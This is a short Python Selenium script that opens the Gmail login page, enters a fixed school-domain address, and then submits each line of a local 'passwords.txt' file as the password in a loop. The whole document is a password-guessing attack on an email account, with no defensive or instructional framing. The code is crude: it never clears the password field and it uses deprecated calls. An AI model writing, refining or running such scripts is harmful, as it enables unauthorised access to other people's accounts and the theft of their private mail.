from selenium import webdriver
driver = webdriver.Chrome(r"C:\Users\Admin\Downloads\chromedriver_win32\chromedriver.exe")
driver.get("https://www.gmail.com")
driver.find_element_by_name("identifier").send_keys("youremail@hdsb.ca")
driver.find_element_by_xpath("//*[@id='identifierNext']/span/span").click()
driver.implicitly_wait(4)


with open("passwords.txt","r") as passwords:
    for i in passwords:
        stripper= i.strip()
        print(i)
        a = stripper
        print(a)
        driver.find_element_by_name("password").send_keys(a)

        driver.find_element_by_xpath("//*[@id='passwordNext']/span/span").click()
        
